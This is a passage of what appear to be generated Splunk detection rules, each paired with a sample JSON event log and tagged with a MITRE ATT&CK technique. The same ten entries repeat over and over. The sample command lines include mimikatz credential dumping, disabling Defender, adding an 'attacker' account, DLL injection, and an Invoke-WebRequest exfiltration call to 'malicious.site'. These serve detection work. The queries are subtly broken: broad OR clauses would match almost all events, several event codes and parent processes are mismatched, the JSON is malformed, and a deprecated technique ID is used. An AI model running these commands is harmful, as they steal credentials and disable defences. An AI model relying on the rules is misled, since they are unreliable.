  "timestamp": "2024-05-28 14:32:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\services.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.103",
  "DestinationPort": "443"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\services.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:34:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\services.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.124",
  "DestinationPort": "80"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\services.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:36:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\services.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.101",
  "DestinationPort": "445"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:38:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.133",
  "DestinationPort": "445"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:40:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.121",
  "DestinationPort": "443"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\lsass.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:42:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\lsass.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.135",
  "DestinationPort": "80"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\wininit.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:44:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\wininit.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.117",
  "DestinationPort": "8443"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 23"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:46:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 23",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.133",
  "DestinationPort": "443"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:48:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.121",
  "DestinationPort": "22"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:50:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.126",
  "DestinationPort": "80"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:52:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.112",
  "DestinationPort": "3389"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\smss.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:54:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\smss.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.118",
  "DestinationPort": "3389"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:56:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.104",
  "DestinationPort": "8443"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:58:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.113",
  "DestinationPort": "8080"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\smss.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:00:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\smss.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.139",
  "DestinationPort": "8443"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\smss.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:02:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\smss.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.106",
  "DestinationPort": "22"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:04:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.102",
  "DestinationPort": "22"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 33"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:06:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 33",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.104",
  "DestinationPort": "8080"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:08:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.135",
  "DestinationPort": "3389"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:10:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.119",
  "DestinationPort": "22"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\lsass.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:12:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\lsass.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.100",
  "DestinationPort": "80"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:14:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.122",
  "DestinationPort": "8080"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:16:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.102",
  "DestinationPort": "443"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:18:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.137",
  "DestinationPort": "443"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:20:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.140",
  "DestinationPort": "80"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:22:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.105",
  "DestinationPort": "8443"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:24:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.150",
  "DestinationPort": "8443"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 43"
OR ParentProcessName="C:\Windows\System32\services.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:26:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 43",
  "ParentProcessName": "C:\Windows\System32\services.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.124",
  "DestinationPort": "8443"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:28:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.148",
  "DestinationPort": "3389"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\lsass.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:30:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\lsass.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.144",
  "DestinationPort": "8443"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\smss.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:32:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\smss.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.128",
  "DestinationPort": "80"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:34:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.130",
  "DestinationPort": "8443"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\wininit.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:36:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\wininit.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.146",
  "DestinationPort": "3389"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\wininit.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:38:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\wininit.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.112",
  "DestinationPort": "80"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:40:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.149",
  "DestinationPort": "3389"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:42:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.111",
  "DestinationPort": "22"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:44:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.140",
  "DestinationPort": "80"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 53"
OR ParentProcessName="C:\Windows\System32\taskhostw.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:46:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 53",
  "ParentProcessName": "C:\Windows\System32\taskhostw.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.127",
  "DestinationPort": "22"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:48:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.113",
  "DestinationPort": "80"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
